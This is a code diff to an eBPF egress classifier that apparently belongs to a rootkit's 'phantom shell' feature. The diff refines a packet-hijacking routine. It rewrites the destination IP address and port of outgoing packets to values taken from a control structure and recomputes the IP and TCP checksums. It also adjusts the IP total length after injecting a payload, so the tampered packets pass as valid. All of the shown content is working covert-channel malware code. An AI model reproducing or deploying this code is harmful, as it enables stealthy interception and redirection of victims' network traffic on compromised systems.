@@ -112,22 +112,37 @@ int classifier_egress(struct __sk_buff *skb){
 	bpf_printk("Phantom shell active now, A:%i IP:%x P:%x\n", ps_data->active, ps_data->d_ip, ps_data->d_port);
 	bpf_printk("Phantom shell param payload: %s\n", ps_data->payload);
 	__u32 new_ip = ps_data->d_ip;
-	__u16 new_port = ps_data->d_port;
-	__u32 offset_ip = offsetof(struct iphdr, daddr)+ sizeof(struct ethhdr);
-	__u32 offset_port = offsetof(struct tcphdr, dest)+ sizeof(struct ethhdr) + sizeof(struct iphdr);
+	__u16 new_dport = ps_data->d_port;
+	__u32 offset_ip_daddr = offsetof(struct iphdr, daddr)+ sizeof(struct ethhdr);
+	__u32 offset_dport = offsetof(struct tcphdr, dest)+ sizeof(struct ethhdr) + sizeof(struct iphdr);
+	__u32 offset_ip_checksum = offsetof(struct iphdr, check)+ sizeof(struct ethhdr);
+	__u32 offset_tcp_checksum = offsetof(struct tcphdr, check)+ sizeof(struct ethhdr) +sizeof(struct iphdr);
 	//bpf_printk("Payload: %s\n", payload);
 	//TODO, adjust the length to the new payload. Verifier complains a lot so we will keep it like this for now
 	__u32 increment_len = sizeof(char)*64;
-	
-	bpf_printk("offset ip: %u\n", offset_ip);
-	int ret = bpf_skb_store_bytes(skb, offset_ip, &new_ip, sizeof(__u32), 0);
+	__u32 old_ip_daddr;
+	bpf_skb_load_bytes(skb, offset_ip_daddr, &old_ip_daddr, sizeof(__u32));
+	__u16 old_dport;
+	bpf_skb_load_bytes(skb, offset_dport, &old_dport, sizeof(__u16));
+	bpf_printk("offset ip: %u\n", offset_ip_daddr);
+	int ret = bpf_l3_csum_replace(skb, offset_ip_checksum, old_ip_daddr, new_ip, sizeof(__u32));
+	if (ret < 0) {
+		bpf_printk("Failed to recompute l3 checksum: %d\n", ret);
+		return TC_ACT_OK;
+	}
+	ret = bpf_skb_store_bytes(skb, offset_ip_daddr, &new_ip, sizeof(__u32), 0);
 	if (ret < 0) {
 		bpf_printk("Failed to overwrite destination ip: %d\n", ret);
 		return TC_ACT_OK;
 	}
 	
-	bpf_printk("offset port: %u\n", offset_port);
-	ret = bpf_skb_store_bytes(skb, offset_port, &new_port, sizeof(__u16), 0);
+	bpf_printk("offset port: %u\n", offset_dport);
+	ret = bpf_l4_csum_replace(skb, offset_tcp_checksum, old_dport, new_dport, sizeof(__u16));
+	if (ret < 0) {
+		bpf_printk("Failed to recompute l4 checksum: %d\n", ret);
+		return TC_ACT_OK;
+	}
+	ret = bpf_skb_store_bytes(skb, offset_dport, &new_dport, sizeof(__u16), 0);
 	if (ret < 0) {
 		bpf_printk("Failed to overwrite destination port: %d\n", ret);
 		return TC_ACT_OK;
@@ -204,6 +219,42 @@ int classifier_egress(struct __sk_buff *skb){
 		bpf_printk("Failed to overwrite payload: %d\n", ret);
 		return TC_ACT_OK;
 	}
+
+	data = (void *)(__u64)skb->data;
+	data_end = (void *)(__u64)skb->data_end;
+	
+	eth = data;
+	if ((void *)eth + sizeof(struct ethhdr) > data_end){
+        bpf_printk("ETH\n");
+		return TC_ACT_OK;
+    }
+	ip = (struct iphdr*)(data + sizeof(struct ethhdr));
+	if ((void *)ip + sizeof(struct iphdr) > data_end){
+		bpf_printk("IP CHECK, ip: %llx, data: %llx, datalen: %llx\n", ip, data, data_end);
+        return TC_ACT_OK;
+    }
+	tcp = (struct tcphdr *)(data + sizeof(struct ethhdr) + sizeof(struct iphdr));
+	if ((void *)tcp + sizeof(struct tcphdr) > data_end){
+		bpf_printk("TCP CHECK\n");
+        return TC_ACT_OK;
+	}
+
+	//Fixing IP checksum
+	//bpf_printk("Old value %x, new value %x\n", htons(ip->tot_len), htons(ntohs(ip->tot_len)+increment_len));
+	__u32 offset_ip_tot_len = offsetof(struct iphdr, tot_len)+ sizeof(struct ethhdr);
+	__u16 new_tot_len = htons(ntohs(ip->tot_len)+increment_len);
+	ret = bpf_l3_csum_replace(skb, offset_ip_checksum, (ip->tot_len), new_tot_len, sizeof(__u16));
+	if (ret < 0) {
+		bpf_printk("Failed to recompute l3 checksum: %d\n", ret);
+		return TC_ACT_OK;
+	}
+	bpf_printk("New ip tot len: %i\n", ntohs(new_tot_len));
+	ret = bpf_skb_store_bytes(skb, offset_ip_tot_len, &new_tot_len, sizeof(__u16), 0);
+	if (ret < 0) {
+		bpf_printk("Failed to overwrite ip total len: %d\n", ret);
+		return TC_ACT_OK;
+	}
+
 	bpf_printk("Finished packet hijacking routine\n");
 
 	return TC_ACT_OK;
